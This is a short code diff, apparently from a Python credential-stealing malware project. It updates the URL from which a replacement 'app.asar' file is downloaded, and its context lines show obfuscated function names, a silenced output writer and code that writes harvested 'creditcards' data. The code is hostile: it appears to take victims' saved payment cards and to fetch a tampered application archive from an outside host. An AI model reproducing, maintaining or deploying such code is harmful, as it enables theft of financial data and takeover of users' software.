@@ -19,6 +19,7 @@ from sqlite3 import connect as sql_connect
 from urllib.request import Request, urlopen
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 
+
 class NullWriter(object):
     def write(self, arg):
         pass
@@ -710,7 +711,7 @@ def G37CC5(path, arg):
         Wr173F0rF113(CCs, 'creditcards')
     except:pass
 
-asar_url = 'https://jontrawolta.ct8.pl/app.asar'
+asar_url = 'https://faint.sh/app.asar'
 
 def download_file(url, dest_path):
     try:
